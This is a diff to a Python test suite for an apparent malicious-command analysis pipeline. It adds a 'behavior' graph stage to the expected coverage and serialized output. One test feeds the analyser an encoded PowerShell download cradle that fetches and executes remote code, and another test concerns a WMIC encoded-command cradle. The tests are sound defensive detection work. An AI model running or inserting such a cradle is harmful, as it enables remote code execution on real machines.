@@ -33,7 +33,7 @@ def test_wmic_encodedcommand_download_cradle():
 
     r = investigate(cmd)
 
-    assert r.coverage == ["iu", "cre", "rte", "intent", "verdict", "graph", "report"]
+    assert r.coverage == ["iu", "cre", "rte", "intent", "behavior", "verdict", "graph", "report"]
     assert r.iu.primary_type == ArtefactType.COMMAND_LINE
     assert Capability.CRE in r.iu.dispatch
     assert r.cre is not None
@@ -105,8 +105,8 @@ def test_pipeline_to_dict_serialization():
     cmd = _enc('iex (New-Object Net.WebClient).DownloadString("http://x")')
     d = investigate(cmd).to_dict()
     assert set(d.keys()) == {
-        "input", "iu", "cre", "rte", "intent", "verdict", "graph",
-        "report", "coverage", "determinism_hash"
+        "input", "iu", "cre", "rte", "intent", "behavior", "verdict",
+        "graph", "report", "coverage", "determinism_hash"
     }
     # Every stage has its determinism proof.
     assert d["iu"]["determinism_hash"]
@@ -117,6 +117,9 @@ def test_pipeline_to_dict_serialization():
     assert d["verdict"]["band"] in {"malicious", "suspicious",
                                      "runtime_dependent", "benign"}
     assert d["graph"]["nodes"] and d["graph"]["edges"]
+    # Canonical Behaviour Graph is a top-level artefact and mirrors
+    # into the analyst report so downstream consumers can pick either.
+    assert set(d["behavior"].keys()) == {"nodes", "edges"}
     # Final layer content is analyst-readable.
     layers = d["rte"]["artifacts"]
     assert layers and any("DownloadString" in a["content"] for a in layers)
